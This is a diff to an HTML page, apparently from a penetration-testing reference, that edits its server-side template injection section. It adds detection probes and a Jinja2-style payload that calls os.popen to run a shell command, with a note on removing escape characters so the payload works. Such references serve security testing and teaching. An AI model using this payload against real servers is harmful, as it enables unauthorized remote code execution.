@@ -283,16 +283,20 @@
 
 <h2 id="syntax-ssti">Syntax SSTI</h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\<span class="p">{</span>\<span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span>\<span class="p">}</span>\<span class="p">}</span>
+\<span class="p">{</span>\<span class="p">{</span> <span class="n">varname</span> \<span class="p">}</span>\<span class="p">}</span>
 
+<span class="o">&lt;</span><span class="n">div</span> <span class="n">data</span><span class="o">-</span><span class="n">gb</span><span class="o">-</span><span class="n">custom</span><span class="o">-</span><span class="n">block</span> <span class="n">data</span><span class="o">-</span><span class="n">tag</span><span class="o">=</span><span class="s">"if"</span> <span class="n">data</span><span class="o">-</span><span class="mi">1</span><span class="o">=</span><span class="s">'1'</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span><span class="n">PRINT</span><span class="o">&lt;</span><span class="n">div</span> <span class="n">data</span><span class="o">-</span><span class="n">gb</span><span class="o">-</span><span class="n">custom</span><span class="o">-</span><span class="n">block</span> <span class="n">data</span><span class="o">-</span><span class="n">tag</span><span class="o">=</span><span class="s">"else"</span><span class="o">&gt;</span><span class="n">NOPRINT</span><span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
 
-&lt;div data-gb-custom-block data-tag="if" data-1='1'&gt;&lt;/div&gt;PRINT&lt;div data-gb-custom-block data-tag="else"&gt;NOPRINT&lt;/div&gt;
 </code></pre></div></div>
 
 <h2 id="rce-remote-code-execution">RCE (Remote Code Execution)</h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div data-gb-custom-block data-tag="for"&gt;&lt;div data-gb-custom-block data-tag="if" data-0='warning'&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">div</span> <span class="n">data</span><span class="o">-</span><span class="n">gb</span><span class="o">-</span><span class="n">custom</span><span class="o">-</span><span class="n">block</span> <span class="n">data</span><span class="o">-</span><span class="n">tag</span><span class="o">=</span><span class="s">"for"</span><span class="o">&gt;&lt;</span><span class="n">div</span> <span class="n">data</span><span class="o">-</span><span class="n">gb</span><span class="o">-</span><span class="n">custom</span><span class="o">-</span><span class="n">block</span> <span class="n">data</span><span class="o">-</span><span class="n">tag</span><span class="o">=</span><span class="s">"if"</span> <span class="n">data</span><span class="o">-</span><span class="mi">0</span><span class="o">=</span><span class="s">'warning'</span><span class="o">&gt;</span>\<span class="p">{</span>\<span class="p">{</span><span class="n">x</span><span class="p">()</span><span class="o">.</span><span class="n">_module</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"touch /tmp/RCE.txt"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>\<span class="p">}</span>\<span class="p">}</span><span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
 </code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: Delete backslashs <strong>{{ }}</strong> in order to permorm the work desired.</p>
+</blockquote>
 
 <p>To bypass some restrictions take a look at the following resources:</p>
 
